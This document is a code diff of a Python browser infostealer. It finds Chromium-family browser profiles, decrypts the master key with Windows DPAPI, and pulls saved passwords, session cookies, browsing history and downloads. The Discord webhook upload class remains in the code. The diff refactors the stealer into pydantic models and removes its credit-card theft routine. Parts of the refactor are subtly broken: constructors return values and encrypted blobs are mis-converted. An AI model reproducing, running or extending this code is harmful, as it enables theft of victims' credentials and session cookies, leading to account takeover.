@@ -1,3 +1,4 @@
+from typing import Any
 import base64
 import json
 import os
@@ -8,19 +9,34 @@ from zipfile import ZipFile
 
 from Crypto.Cipher import AES
 from discord import Embed, File, SyncWebhook
+from pydantic import BaseModel
 from win32crypt import CryptUnprotectData
 
-__LOGINS__ = []
-__COOKIES__ = []
-__WEB_HISTORY__ = []
-__DOWNLOADS__ = []
-__CARDS__ = []
+class Login(BaseModel):
+    url: str
+    username: str
+    password: str
+
+class Cookie(BaseModel):
+    host: str
+    name: str
+    path: str
+    value: str
+    expires: str
+
+class WebHistory(BaseModel):
+    url: str
+    title: str
+    timestamp: str
+
+class Download(BaseModel):
+    tab_url: str
+    target_path: str
 
 
 class Browsers:
-    def __init__(self):
-        Chromium()
-        Upload(self.webhook)
+    def __init__(self) -> dict[str, Any]:
+        return Chromium()
 
 
 class Upload:
@@ -96,8 +112,13 @@ class Upload:
 
 
 class Chromium:
-    def __init__(self):
+    def __init__(self) -> dict[str, Any]:
         self.appdata = os.getenv('LOCALAPPDATA')
+        
+        # If inaccessible, don't make assumptions and just quit immediately
+        if not self.appdata:
+            return {}
+        
         self.browsers = {
             'amigo': self.appdata + '\\Amigo\\User Data',
             'torch': self.appdata + '\\Torch\\User Data',
@@ -124,8 +145,10 @@ class Chromium:
             'Profile 4',
             'Profile 5',
         ]
+        
+        res = {}
 
-        for _, path in self.browsers.items():
+        for name, path in self.browsers.items():
             if not os.path.exists(path):
                 continue
 
@@ -133,31 +156,36 @@ class Chromium:
             if not self.master_key:
                 continue
 
+            res[name] = {}
+
             for profile in self.profiles:
                 if not os.path.exists(path + '\\' + profile):
                     continue
+                
+                res[name][profile] = {}
 
-                operations = [
-                    self.get_login_data,
-                    self.get_cookies,
-                    self.get_web_history,
-                    self.get_downloads,
-                    self.get_credit_cards,
-                ]
+                operations = {
+                    "logins": self.get_login_data,
+                    "cookies": self.get_cookies,
+                    "history": self.get_web_history,
+                    "downloads": self.get_downloads
+                }
 
-                for operation in operations:
+                for datatype, operation in operations.items():
                     try:
-                        operation(path, profile)
+                        res[name][profile][datatype] = operation(path, profile)
                     except Exception as e:
-                        # print(e)
+                        print(e)
                         pass
+                    
+        return res
 
-    def get_master_key(self, path: str) -> str:
+    def get_master_key(self, path: str) -> str | None:
         if not os.path.exists(path):
-            return
+            return None
 
         if 'os_crypt' not in open(path, 'r', encoding='utf-8').read():
-            return
+            return None
 
         with open(path, "r", encoding="utf-8") as f:
             c = f.read()
@@ -177,10 +205,11 @@ class Chromium:
 
         return decrypted_pass
 
-    def get_login_data(self, path: str, profile: str):
+    def get_login_data(self, path: str, profile: str) -> list[dict]:
+        res: list[dict] = []
         login_db = f'{path}\\{profile}\\Login Data'
         if not os.path.exists(login_db):
-            return
+            return res
 
         shutil.copy(login_db, 'login_db')
         conn = sqlite3.connect('login_db')
@@ -191,16 +220,19 @@ class Chromium:
             if not row[0] or not row[1] or not row[2]:
                 continue
 
-            password = self.decrypt_password(row[2], self.master_key)
-            __LOGINS__.append(Types.Login(row[0], row[1], password))
+            password = self.decrypt_password(bytes(row[2], 'utf-8'), self.master_key)
+            res.append(Login(url=row[0], username=row[1], password=password).model_dump())
 
         conn.close()
         os.remove('login_db')
+        
+        return res
 
-    def get_cookies(self, path: str, profile: str):
+    def get_cookies(self, path: str, profile: str) -> list[dict]:
+        res: list[dict] = []
         cookie_db = f'{path}\\{profile}\\Network\\Cookies'
         if not os.path.exists(cookie_db):
-            return
+            return res
 
         try:
             shutil.copy(cookie_db, 'cookie_db')
@@ -212,20 +244,23 @@ class Chromium:
                 if not row[0] or not row[1] or not row[2] or not row[3]:
                     continue
 
+                assert self.master_key is not None
                 cookie = self.decrypt_password(row[3], self.master_key)
-                __COOKIES__.append(Types.Cookie(
-                    row[0], row[1], row[2], cookie, row[4]))
+                res.append(Cookie(host=row[0], name=row[1], path=row[2], value=cookie, expires=row[4]).model_dump())
 
             conn.close()
         except Exception as e:
             print(e)
 
         os.remove('cookie_db')
+        return res
 
-    def get_web_history(self, path: str, profile: str):
+    def get_web_history(self, path: str, profile: str) -> list[dict]:
+        res: list[dict] = []
+        
         web_history_db = f'{path}\\{profile}\\History'
         if not os.path.exists(web_history_db):
-            return
+            return res
 
         shutil.copy(web_history_db, 'web_history_db')
         conn = sqlite3.connect('web_history_db')
@@ -235,15 +270,19 @@ class Chromium:
             if not row[0] or not row[1] or not row[2]:
                 continue
 
-            __WEB_HISTORY__.append(Types.WebHistory(row[0], row[1], row[2]))
+            res.append(WebHistory(url=row[0], title=row[1], timestamp=row[2]).model_dump())
 
         conn.close()
         os.remove('web_history_db')
+        
+        return res
 
-    def get_downloads(self, path: str, profile: str):
+    def get_downloads(self, path: str, profile: str) -> list[dict]:
+        res: list[dict] = []
+        
         downloads_db = f'{path}\\{profile}\\History'
         if not os.path.exists(downloads_db):
-            return
+            return res
 
         shutil.copy(downloads_db, 'downloads_db')
         conn = sqlite3.connect('downloads_db')
@@ -252,94 +291,13 @@ class Chromium:
         for row in cursor.fetchall():
             if not row[0] or not row[1]:
                 continue
-
-            __DOWNLOADS__.append(Types.Download(row[0], row[1]))
+            res.append(Download(tab_url=row[0], target_path=row[1]).model_dump())
 
         conn.close()
         os.remove('downloads_db')
-
-    def get_credit_cards(self, path: str, profile: str):
-        cards_db = f'{path}\\{profile}\\Web Data'
-        if not os.path.exists(cards_db):
-            return
-
-        shutil.copy(cards_db, 'cards_db')
-        conn = sqlite3.connect('cards_db')
-        cursor = conn.cursor()
-        cursor.execute(
-            'SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted, date_modified FROM credit_cards')
-        for row in cursor.fetchall():
-            if not row[0] or not row[1] or not row[2] or not row[3]:
-                continue
-
-            card_number = self.decrypt_password(row[3], self.master_key)
-            __CARDS__.append(Types.CreditCard(
-                row[0], row[1], row[2], card_number, row[4]))
-
-        conn.close()
-        os.remove('cards_db')
+        
+        return res
 
 
-class Types:
-    class Login:
-        def __init__(self, url, username, password):
-            self.url = url
-            self.username = username
-            self.password = password
 
-        def __str__(self):
-            return f'{self.url}\t{self.username}\t{self.password}'
 
-        def __repr__(self):
-            return self.__str__()
-
-    class Cookie:
-        def __init__(self, host, name, path, value, expires):
-            self.host = host
-            self.name = name
-            self.path = path
-            self.value = value
-            self.expires = expires
-
-        def __str__(self):
-            return f'{self.host}\t{"FALSE" if self.expires == 0 else "TRUE"}\t{self.path}\t{"FALSE" if self.host.startswith(".") else "TRUE"}\t{self.expires}\t{self.name}\t{self.value}'
-
-        def __repr__(self):
-            return self.__str__()
-
-    class WebHistory:
-        def __init__(self, url, title, timestamp):
-            self.url = url
-            self.title = title
-            self.timestamp = timestamp
-
-        def __str__(self):
-            return f'{self.url}\t{self.title}\t{self.timestamp}'
-
-        def __repr__(self):
-            return self.__str__()
-
-    class Download:
-        def __init__(self, tab_url, target_path):
-            self.tab_url = tab_url
-            self.target_path = target_path
-
-        def __str__(self):
-            return f'{self.tab_url}\t{self.target_path}'
-
-        def __repr__(self):
-            return self.__str__()
-
-    class CreditCard:
-        def __init__(self, name, month, year, number, date_modified):
-            self.name = name
-            self.month = month
-            self.year = year
-            self.number = number
-            self.date_modified = date_modified
-
-        def __str__(self):
-            return f'{self.name}\t{self.month}\t{self.year}\t{self.number}\t{self.date_modified}'
-
-        def __repr__(self):
-            return self.__str__()
